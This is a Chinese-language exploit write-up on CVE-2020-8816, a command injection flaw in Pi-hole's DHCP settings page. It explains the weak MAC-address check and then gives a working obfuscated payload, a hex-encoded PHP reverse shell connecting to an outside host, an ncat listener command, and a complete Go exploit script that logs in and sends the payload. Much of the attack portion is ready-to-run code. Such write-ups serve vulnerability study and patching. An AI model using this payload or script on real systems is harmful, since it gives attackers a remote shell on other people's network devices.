（CVE 2020-8816）Pi-hole 远程代码执行漏洞
=========================================

一、漏洞简介
------------

二、漏洞影响
------------

Pi-hole \<= 4.3.2

三、复现过程
------------

### 漏洞分析

> ./scripts/pi-hole/php/savesettings.php

    {
      // Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)
      return (preg_match('/([a-fA-F0-9]{2}[:]?){6}/', $mac_addr) == 1);    
    }

    $mac = $_POST["AddMAC"];

    if(!validMAC($mac)) {...}

    $mac = strtoupper($mac);

    if(isset($_POST["addstatic"])) {
        ...
        exec("sudo pihole -a addstaticdhcp ".$mac." ".$ip." ".$hostname);
        ...
    }

    if(isset($_POST["removestatic"])) {
        ...
        exec("sudo pihole -a removestaticdhcp ".$mac);
        ...
    }

注意到，在validMAC函数中，只使用preg\_match对MAC地址的格式进行了检查，而preg\_match函数的作用是根据正则表达式的模式对字符串进行搜索匹配，并返回匹配字数。因此，只要用户的输入中存在MAC地址，就可以通过检查。

通过检查的用户输入做了一次大写转换，然后直接放入了exec函数中。

**最终的payload**

    aaaaaaaaaaaa&&SHORT=${PATH##/***:/}&&A=${SHORT#???}&&P=${A%/???}&&B=${PWD#/???/???/}&&H=${B%???/?????}&&C=${PWD#/??}&&R=${C%/???/????/?????}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"));'&&

#### payload分析

-   1、模拟MAC地址

```{=html}
<!-- -->
```
    aaaaaaaaaaaa

根据源码中的validMAC()函数，我们得知程序会对用户输入做一个基本的MAC地址格式判断，只要由12个字母或数字组成，就可以通过验证。

-   2、获取p,h,r的小写字符

```{=html}
<!-- -->
```
    SHORT=${PATH##/***:/}&&A=${SHORT#???}&&P=${A%/???}&&B=${PWD#/???/???/}&&H=${B%???/?????}&&C=${PWD#/??}&&R=${C%/???/????/?????}

原本的payload应该为：

    aaaaaaaaaaaa&&php -r ‘$sock=fsockopen(“target.0-sec.org”,2256);exec(“/bin/sh -i <&3 >&3 2>&3”);’

但是由于程序会对用户输入做一个大写转换，因此，php -r会变成PHP
-R，命令无法识别，因此需要找到一种方式获取p、h、r的小写字符。

可以使用环境变量，变量名都是大写字母，而变量值中可能包含各种小写字母。

在浏览器中进入http://www.0-sec.org/admin，登陆后，选择Setting-\>DHCP选项卡，先试一下PATH变量，输入aaaaaaaaaaaa\$PATH，结果显示：

![1.png](./.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId26.png)

很遗憾，没有h字符，看来还需要找其他环境变量。我在env命令的执行结果中找到了PWD变量，输入试一下：

![2.png](./.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId27.png)

里面有h和r，所以，我可以使用PATH和PWD两个环境变量，获得p、h、r这几个字符。

我使用了[Shell参数扩展](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html)对这两个变量值进行截取：

    p:
        SHORT=${PATH##/***:/}&&A=${SHORT#???}&&P=${A%/???}
    h:
        B=${PWD#/???/???/}&&H=${B%???/?????}
    r:
        C=${PWD#/??}&&R=${C%/???/????/?????}

根据[模式匹配](https://www.gnu.org/software/bash/manual/html_node/Pattern-Matching.html#Pattern-Matching)的规则，应该可以写出更简洁的方法，但是我的系统中好多shell选项都没有开启，考虑到通用性，我就直接选择了最傻瓜的匹配方式。

3、获得反向shell

    $P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"));'

先把变量换成对应的字符，注意上面的`$IFS`是shell的一个内定变量，默认为`<space><tab><newline>`，这里代替空格。

    php -r 'exec(hex2bin("706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"))'

然后替换`hex2bin`的执行结果（转义符是我后加的）：

    php -r 'exec(php -r \'$sock=fsockopen("target.0-sec.org",2256);exec("/bin/sh -i <&3 >&3 2>&3");\')'

这段代码就可以获得一个反向shell。

漏洞复现
--------

在主机的命令行中输入：

    ncat -nlvp 2256

进入监听模式，等待其他机器的连接。

返回虚拟机，在浏览器中打开`http://192.168.1.107/admin`，登录，选择Setting-\>DHCP选项卡，输入payload：

    aaaaaaaaaaaa&&SHORT=${PATH##/***:/}&&A=${SHORT#???}&&P=${A%/???}&&B=${PWD#/???/???/}&&H=${B%???/?????}&&C=${PWD#/??}&&R=${C%/???/????/?????}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"));'&&

返回主机，可以看到主机收到了连接，可以执行命令了：![3.png](./.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId31.png)

### poc

> CVE-2020-8816.go

`go run CVE-2020-8816.go -host $LHOST -p $LPORT -pass admin -u http://www.0-sec.org/admin/`

`./CVE-2020-8816 -host $LHOST -p $LPORT -pass admin -u http://www.0-sec.org/admin/`

![4.png](./.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId33.png)

![5.png](./.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId34.png)

![6.png](./.resource/(CVE2020-8816)Pi-hole远程代码执行漏洞/media/rId35.png)

    package main


    import (
        "flag"
        "log"
        "strings"
        "github.com/anaskhan96/soup"
        "encoding/hex"
        "github.com/levigross/grequests"
    )

    type Options struct {
        url, password, host, port string
       
    }


    var HOST string
    var URL string
    var PORT string
    var PASSWD string

    func generate_shell() string{
        payload := "php -r '$sock=fsockopen(\"HOST\", PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        payload = strings.Replace(payload, "HOST", HOST, 1)
        payload = strings.Replace(payload, "PORT", PORT, 1)
        return hex.EncodeToString([]byte(payload))
    }

    func extractFlags() *Options {
        urlPtr := flag.String("u", "http://10.0.0.1/admin/", "Set the Url of the admin panel")
        passPtr := flag.String("pass", "admin", "Admin Password")
        hostPtr := flag.String("host", "10.0.0.1", "Set the host for the reverse shell")
        portPtr := flag.String("p", "1337", "Set Port for the reverse shell")
        flag.Parse()

        return &Options{*urlPtr, *passPtr, *hostPtr,*portPtr}
    }

    func doLogin(ses *grequests.Session) *grequests.Session{
        log.Println("Logging In...")
        resp, err := ses.Post(URL+"index.php",&grequests.RequestOptions{Data: map[string]string{"pw": PASSWD}})
        if err != nil {
            log.Fatal("Error logging-in: ", err)
        }

        if resp.Ok != true {
            log.Println("Request for log-in did not return OK")
        }
        log.Println("Logged In!")
        return ses
    }

    func getToken(ses *grequests.Session) string{
        resp, err:= ses.Get(URL+"index.php",nil)
            if err != nil {
            log.Fatal("Error getting token: ", err)
        }

        if resp.Ok != true {
            log.Println("Request for getting token did not return OK")
        }
        html := soup.HTMLParse(resp.String())
        token := html.Find("div","id","token").Text()
        return token
    }

    func Exploit(ses *grequests.Session, token string, payload string) {
        full_payload := "aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN(\"" + payload + "\"));'&&"
        resp,err := ses.Post(URL + "settings.php", &grequests.RequestOptions{Data: map[string]string{
            "AddMAC":full_payload,
            "field":"DHCP",
            "AddIP":"10.10.10.10", 
            "AddHostname":"10.10.10.10", 
            "addstatic":"", 
            "token":token}})
                if err != nil {
            log.Fatal("Error sending payload: ", err)
        }

        if resp.Ok != true {
            log.Println("Request for sending payload did not return OK")
        }
    }


    func main(){
        options := extractFlags()
        HOST = options.host
        URL = options.url
        PORT = options.port
        PASSWD = options.password 
        session := grequests.NewSession(nil)
        doLogin(session)
        log.Println("Getting Token...")
        token := getToken(session)
        log.Println("Token:",token)
        log.Println("Generating payload...")
        payload := generate_shell()
        log.Println("Payload generated:",payload)
        log.Println("Sending exploit...")
        Exploit(session, token, payload)
        log.Println("Exploit executed, check your session")
    }

参考链接
--------

> https://www.freebuf.com/vuls/234533.html
>
> https://github.com/team0se7en/CVE-2020-8816/blob/master/CVE-2020-8816.go
